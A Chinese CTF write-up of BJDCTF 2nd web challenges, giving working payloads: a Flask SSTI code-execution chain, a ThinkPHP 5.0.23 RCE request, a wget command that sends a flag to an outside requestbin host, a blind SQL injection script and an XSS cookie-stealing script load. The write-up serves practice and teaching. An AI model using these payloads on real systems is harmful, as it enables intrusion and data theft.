# WEB
## [BJDCTF 2nd]fake google
打开是google搜索页面，尝试ssti：
```
{{7*7}}
```
成功，猜测是flask，使用大师傅的任意代码执行poc（同[GYCTF2020]FlaskApp）：
```
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("ls /").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```
得到目录：
```
app bd_build bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var 
```
`cat /flag`即可得到flag

----
## [BJDCTF 2nd]old-hack
进去提示是thinkphp，然后我们尝试查看phpinfo：
```
?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1`
```
最底部得到thinkphp版本V5.0.23，搜索后发现一个[RCE漏洞](https://blog.csdn.net/qq_38807738/article/details/86777541)，尝试使用payload：
```
Header: Content-Type: application/x-www-form-urlencoded
GET: /index.php?s=captcha
POST: _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls /
```
找到flag文件，查看得到flag：
```
POST: _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=cat /flag
```

----
## [BJDCTF 2nd]duangShell
打开后提示有swp文件，尝试后发现是`.index.php.swp`，还原：
```
vi -r index.php.swp
```
得到源码：
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>give me a girl</title>
</head>
<body>
    <center><h1>ç��çˆ±ç½‘</h1></center>
</body>
</html>
<?php
error_reporting(0);
echo "how can i give you source code? .swp?!"."<br>";
if (!isset($_POST['girl_friend'])) {
    die("where is P3rh4ps's girl friend ???");
} else {
    $girl = $_POST['girl_friend'];
    if (preg_match('/\>|\\\/', $girl)) {
        die('just girl');
    } else if (preg_match('/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i', $girl)) {
        echo "<img src='img/p3_need_beautiful_gf.png'> <!-- He is p3 -->";
    } else {
        //duangShell~~~~
        exec($girl);
    }
}
```
发现ban掉的命令不算多，还能使用wget带出数据：
```
girl_friend=wget http://http.requestbin.buuoj.cn/1olu1ug1/`c"a"t /"f"lag`
```
得到flag

----
## [BJDCTF 2nd]简单注入
打开好像看到了熟悉的界面，据说是简单注入：
```
username=admin,password=admin'
```
发现被检测到了，然后dirsearch，发现robots.txt，里面藏了hint：
```
Only u input the correct password then u can get the flag
and p3rh4ps wants a girl friend.

select * from users where username='$_POST["username"]' and password='$_POST["password"]';

//出题人四级压线才过 见谅见谅 领会精神
```
fuzz发现过滤：
```
select
=
'
&
-
"
&&
and
```
测试后发现可以使用布尔盲注：
```
username=\
password=or 1>2#
```
前面的反斜杠将username本身自带的引号转义，将原语句化为`select * from users where username='$_POST["username"]\' and password='$_POST["password"]';`，也就是username变成了`$_POST["username"]\' and password=`，我们再加上password，整条语句就变成了：
```
select * from users where username='xxxxxx'or 1>2#';
```
上脚本跑:
```
import requests
import string

url = 'http://42c65e79-aa90-457c-a8fd-fef5d1c22b8d.node3.buuoj.cn/index.php'
ans = ''

#database()==p3rh4ps
#username==admin
#password==OhyOuFOuNdit

chrs = string.printable

for i in range(1, 40):
    for j in chrs:
        payload = "or (if(ascii(substr(password,%s,1))>%s,1,0))#" % (str(i), str(ord(j)))
        
        res1 = requests.post(url, data={'username': '\\', 'password': payload})
        res2 = requests.post(url, data={'username': '\\', 'password': payload.replace('>', '<')})

        if 'P3rh4ps' in res1.text:
            if 'P3rh4ps' in res2.text:
                ans += j
                print(ans)
                break
```
输入即可得到flag

----
## [BJDCTF 2nd]假猪套天下第一
打开后是一个登录页面，随便尝试了一下发现能正常登入，但是admin会提示。扫目录发现了`.DS_Store`文件，使用`ds_store_exp`发现了`L0g1n.php`，访问，提示：
```
Sorry, this site will be available after totally 99 years!
```
抓包，发现time，加几个零，提示：
```
Sorry, this site is only optimized for those who comes from localhost
```
改xff，提示:
```
Do u think that I dont know X-Forwarded-For?<br>Too young too simple sometimes naive
```
使用`Client-ip: 127.0.0.1`，显示：
```
Sorry, this site is only optimized for those who come from gem-love.com
```
改referer，显示：
```
Sorry, this site is only optimized for browsers that run on Commodo 64
```
修改UA为：
```
Contiki/1.0 (Commodore 64; http://dunkels.com/adam/contiki/)
```
显示：
```
Sorry, this site is only optimized for those whose email is root@gem-love.com
```
改From，显示：
```
Sorry, this site is only optimized for those who use the http proxy of y1ng.vip<br> if you dont have the proxy, pls contact us to buy, ￥100/Month
```
改Via，显示：
```
Sorry, even you are good at http header, you're still not my admin.<br> Althoungh u found me, u still dont know where is flag <!--ZmxhZ3s5ZmZmNGMzZS1iMmZkLTQzMmQtYWMyNi0yZjkzNDFkZGM1MzR9Cg==-->
```
base64解码，得到flag

----
## [BJDCTF 2nd]Schrödinger
扫目录:
```
[14:11:56] 200 -    2KB - /index.php
[14:13:54] 200 -    2KB - /test.php
```
访问test.php，发现是个登录页，尝试注入无果，于是返回主页，抓包发现有cookie，base64解码发现是一串数字，改成-10000，`url=127.0.0.0.1/test.php`，然后整上，发现进度为99%，点一下check，继续改为-10000，得到密码，发现b站av号，访问，按时间排序找到3月12日的Hello my friend from BJD！ BJD{Quantum_Mechanics_really_Ez}，得到flag

----
## [BJDCTF 2nd]xss之光
扫目录，发现有git泄露，于是githack得到源码：
```
<?php
$a = $_GET['yds_is_so_beautiful'];
echo unserialize($a);
```
看起来是个反序列化，找到出题人的[博客](http://blog.ydspoplar.top/2020/03/17/php%E5%8F%AF%E5%88%A9%E7%94%A8%E7%9A%84%E5%8E%9F%E7%94%9F%E7%B1%BB/)，使用xss平台：
```
<?php
$a = new Exception("<script src=http://xss.buuoj.cn/vliIUf></script>");
echo urlencode(serialize($a));
```
整进去，查看cookie，得到flag

----
## [BJDCTF 2nd]elementmaster
扫目录，发现`.DS_Store`，把文件整下来，结果p都没有。hint中提到门捷列夫，所以整一个元素周期表.php，看看存在啥：
```
import requests

url = 'http://d97c8999-10ee-4cc2-b8e7-ea4b27656844.node3.buuoj.cn/'

ele=['H', 'He', 'Li', 'Be', 'B', 'C', 'N', 'O', 'F', 'Ne', 'Na', 'Mg', 'Al', 'Si', 'P', 'S', 'Cl', 'Ar',
    'K', 'Ca', 'Sc', 'Ti', 'V', 'Cr', 'Mn', 'Fe', 'Co', 'Ni', 'Cu', 'Zn', 'Ga', 'Ge', 'As', 'Se', 'Br', 
    'Kr', 'Rb', 'Sr', 'Y', 'Zr', 'Nb', 'Mo', 'Te', 'Ru', 'Rh', 'Pd', 'Ag', 'Cd', 'In', 'Sn', 'Sb', 'Te', 
    'I', 'Xe', 'Cs', 'Ba', 'La', 'Ce', 'Pr', 'Nd', 'Pm', 'Sm', 'Eu', 'Gd', 'Tb', 'Dy', 'Ho', 'Er', 'Tm', 
    'Yb', 'Lu', 'Hf', 'Ta', 'W', 'Re', 'Os', 'Ir', 'Pt', 'Au', 'Hg', 'Tl', 'Pb', 'Bi', 'Po', 'At', 'Rn', 
    'Fr', 'Ra', 'Ac', 'Th', 'Pa', 'U', 'Np', 'Pu', 'Am', 'Cm', 'Bk', 'Cf', 'Es', 'Fm','Md', 'No', 'Lr',
    'Rf', 'Db', 'Sg', 'Bh', 'Hs', 'Mt', 'Ds', 'Rg', 'Cn', 'Nh', 'Fl', 'Mc', 'Lv', 'Ts', 'Og', 'Uue']

ans = ''

for i in ele:
    res = requests.get(url + i + '.php')
    if res.status_code != 404:
        print(i + ' is ans')
        ans += res.text
    else:
        print('shit')

print(ans)
```
得到页面地址：
```
And_th3_3LemEnt5_w1LL_De5tR0y_y0u.php
```
得到flag

# REVERSE
## [BJDCTF 2nd]guessgame
下载下来用记事本打开，搜索BJD，得到flag